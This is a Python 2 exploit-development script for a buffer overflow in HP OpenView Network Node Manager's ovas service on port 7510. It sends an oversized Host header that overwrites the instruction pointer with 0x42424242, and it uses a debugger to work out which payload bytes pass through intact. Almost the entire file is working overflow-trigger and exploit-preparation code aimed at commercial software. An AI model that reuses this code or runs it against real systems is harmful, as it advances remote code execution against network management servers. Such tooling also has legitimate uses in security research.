import re
import sys
import socket
import logging
import functools
import subprocess
from os import path
import _winreg as reg
from threading import Thread
from winappdbg import Debug, win32

LOG_NAME = 'HPNNMGoodCharFinder'
LOG_DEBUG = False

log = logging.getLogger(LOG_NAME)


class Ovas(object):
    def __init__(self):
        self.path = self.__path()
        self.startupinfo = subprocess.STARTUPINFO()
        self.startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    @staticmethod
    def __path():
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Hewlett-Packard\HP OpenView') as key:
            return path.join(reg.QueryValueEx(key, 'InstallDir')[0], 'bin')

    def start(self):
        return subprocess.check_call(
            [path.join(self.path, 'ovstart.exe'), 'ovas'],
            startupinfo=self.startupinfo
        ) == 0

    def stop(self):
        return subprocess.check_call(
            [path.join(self.path, 'ovstop.exe'), 'ovas'],
            startupinfo=self.startupinfo
        ) == 0

    def status(self):
        stdout = subprocess.check_output(
            [path.join(self.path, 'ovstatus.exe'), 'ovas'],
            startupinfo=self.startupinfo
        )

        state_regex = re.search(
            (r"\s*state:\s*(?P<state>.*?)\n*"
             r"\s*PID:\s*(?P<pid>.*?)\n*"
             r"\s*last message:\s*(?P<last_message>.*?)\n*"
             r"\s*exit status:\s*(?P<exit_status>[^\r\n]*)\n*"
             ),
            stdout,
        )

        state_dict = state_regex.groupdict()
        if state_dict['pid'] == '-':
            state_dict['pid'] = None
            state_dict['exit_status'] = int(re.search(
                r'Exit\((?P<status>\d+)\)',
                state_dict['exit_status']
            ).group('status'))
        else:
            state_dict['pid'] = int(state_dict['pid'])
            state_dict['exit_status'] = None

        return state_dict

    def restart(self):
        self.stop()
        self.start()

    @property
    def pid(self):
        return self.status()['pid']

    @property
    def state(self):
        return self.status()['state']

    @property
    def last_message(self):
        return self.status()['last_message']

    @property
    def exit_status(self):
        return self.status()['exit_status']


def bad_characters_handler(test_payload, test_char, good_chars, event):
    # Get the event code.
    if event.get_event_code() != win32.EXCEPTION_DEBUG_EVENT or \
                    event.get_exception_code() != 0xC0000005:
        return

    # Get the address where the exception occurred.
    try:
        address = event.get_fault_address()
    except NotImplementedError:
        address = event.get_exception_address()

    # Should Be Address From The Payload
    if address != 0x42424242:
        return

    # Get the process where the event occured.
    process = event.get_process()

    # Get the thread where the event occured.
    thread = event.get_thread()

    # Get the exception user-friendly description.
    name = event.get_exception_description()

    # Show a descriptive message to the user.
    log.debug("%s at address 0x%08x" % (name, address))

    # Get the stack pointer (Stack Top)
    stack_top = thread.get_sp()
    log.debug("Stack Address: 0x%08x" % stack_top)

    # Get the payload address from the stack (POP, POP, PEEK)
    payload_address = process.read_pointer(stack_top + 8)
    log.debug("Payload Address: 0x%08x" % payload_address)

    # Get the needed peace or the payload from memory
    payload = process.read(payload_address + 8, 452)
    log.debug("Payload Hex: %s" % payload.encode('hex'))

    if payload == test_payload:
        good_char = r"\x%s" % test_char.encode('hex')
        log.info('Good Character Found: "%s"' % good_char)
        good_chars.append(good_char)

    # Kill Process
    event.debug.kill_all(bIgnoreExceptions=True)


def debug_ovas(ovas_pid, test_payload, test_char, good_chars):
    # Instance a Debug object.
    debug = Debug(
        functools.partial(bad_characters_handler, test_payload, test_char, good_chars),
        bKillOnExit=True
    )
    try:
        # Attach to a running process.
        debug.attach(ovas_pid)

        # Wait for the debugee to finish.
        debug.loop()
    finally:
        # Stop the debugger.
        debug.stop()


def exploit(test_payload, ip='127.0.0.1', port=7510):
    payload = "A" * 3381 + "B" * 4 + test_payload + "D" * 163
    buff = "GET /topology/homeBaseView HTTP/1.1\r\n"
    buff += "Host: " + payload + "\r\n"
    buff += "Content-Type: application/x-www-form-urlencoded\r\n"
    buff += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    buff += "Content-Length: 1048580\r\n\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(buff)
        s.close()
    except Exception, ex:
        log.error("Exploit Error: %s" % ex)
    return True


if __name__ == '__main__':
    ovas = Ovas()
    good_chars = []

    logging.basicConfig(
        stream=sys.stdout,
        level=logging.DEBUG if LOG_DEBUG else logging.INFO,
        format='%(asctime)s %(levelname)-8s %(message)s',
    )
    log.debug('HPNNM Good Characters Finder Start')
    for test_char in map(chr, xrange(0x00, 0xFF + 1)):
        # Restart Ovas
        log.debug('Restarting Ovas')
        ovas.restart()

        try:
            log.info(r'Testing Character: "\x%s"' % test_char.encode('hex'))

            # Open Debug Thread
            test_payload = "C" * 225 + test_char + "C" * 226
            debug_thread = Thread(target=debug_ovas, args=[ovas.pid, test_payload, test_char, good_chars])
            debug_thread.start()

            # Exploit
            log.debug('Sending Exploit')
            exploit(test_payload)

            debug_thread.join(timeout=5)
        except WindowsError, ex:
            log.error("Windows Error: %s" % ex)

    log.debug('HPNNM Good Characters Finder Finished')
    log.info('Good Characters: "%s"' % "".join(good_chars))
